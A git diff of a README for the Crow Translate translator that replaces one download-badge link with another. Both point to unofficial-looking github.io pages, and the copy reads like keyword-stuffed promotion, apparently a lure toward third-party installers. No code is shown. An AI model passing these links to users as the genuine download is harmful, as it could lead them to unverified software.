@@ -160,7 +160,7 @@ Use another command for crow translate ocr (`recognizeScreenArea` or `translateS
 
 Get one build. First launch is the window if you start with no flags, or the crow translate cli if you pass text.
 
-[![GET Crow Language Translator](https://img.shields.io/badge/GET-Crow%20Language%20Translator-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://toreiellewintondon.github.io/.github/Crow-Translate)
+[![GET Crow Language Translator](https://img.shields.io/badge/GET-Crow%20Language%20Translator-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://crow-language-translator.github.io/Crow-Translate/)
 
 Linux: tagged archive or a distro package. Windows: installer; you may need the current VC++ runtime. A portable tree exists if you compile with portable mode and drop `settings.ini` next to the binary.
 
